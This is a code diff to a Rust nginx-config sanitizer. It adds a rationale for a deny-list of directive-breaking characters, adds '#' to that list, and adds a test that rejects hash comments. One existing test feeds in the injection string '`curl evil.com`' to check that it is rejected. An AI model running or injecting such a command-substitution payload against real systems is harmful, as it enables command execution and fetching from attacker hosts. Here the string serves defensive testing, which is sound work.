@@ -2,11 +2,26 @@
 //!
 //! Validates and sanitizes environment variable values before they are
 //! inserted into nginx config templates, preventing nginx directive injection.
+//!
+//! # Why a deny-list, not an allow-list
+//!
+//! An allow-list is the generally safer default, but it was deliberately not
+//! adopted here: `NGINX_SERVER_NAME` alone has to accommodate space/comma
+//! separated hostname lists, IPv6 literals (`[::1]`), wildcards (`*.example.com`),
+//! and regex-anchored forms (`~^(?<sub>.+)\.example\.com$`) — enumerating every
+//! legitimate character across those forms without access to real-world usage
+//! risks silently rejecting valid values in a running deployment, which is worse
+//! than the deny-list it would replace. Instead, every character structurally
+//! required to terminate an nginx directive and start another — `;`, `{`, `}`,
+//! and newlines — is blocked outright, which is sufficient on its own regardless
+//! of what else is allowed: nginx directives cannot be split, block-nested, or
+//! chained without one of those four. The remaining entries (backtick, `$`,
+//! quotes, `#`) are defense in depth against nginx variable interpolation and
+//! template contexts that might quote or comment differently than today's.
 
 use std::collections::HashMap;
 
-/// Characters that could inject nginx directives when placed inside config values.
-const NGINX_DANGEROUS_CHARS: &[char] = &[';', '{', '}', '\n', '\r', '`', '$', '\\', '"', '\''];
+const NGINX_DANGEROUS_CHARS: &[char] = &[';', '{', '}', '\n', '\r', '`', '$', '\\', '"', '\'', '#'];
 
 /// Sanitize a value destined for an nginx config template.
 /// Rejects values containing characters that could inject nginx directives.
@@ -62,6 +77,11 @@ mod tests {
     #[test]
     fn test_sanitize_nginx_value_rejects_backticks() {
         assert!(sanitize_nginx_value("PORT", "`curl evil.com`").is_err());
+    }
+
+    #[test]
+    fn test_sanitize_nginx_value_rejects_hash() {
+        assert!(sanitize_nginx_value("NGINX_SERVER_NAME", "example.com # comment").is_err());
     }
 
     #[test]
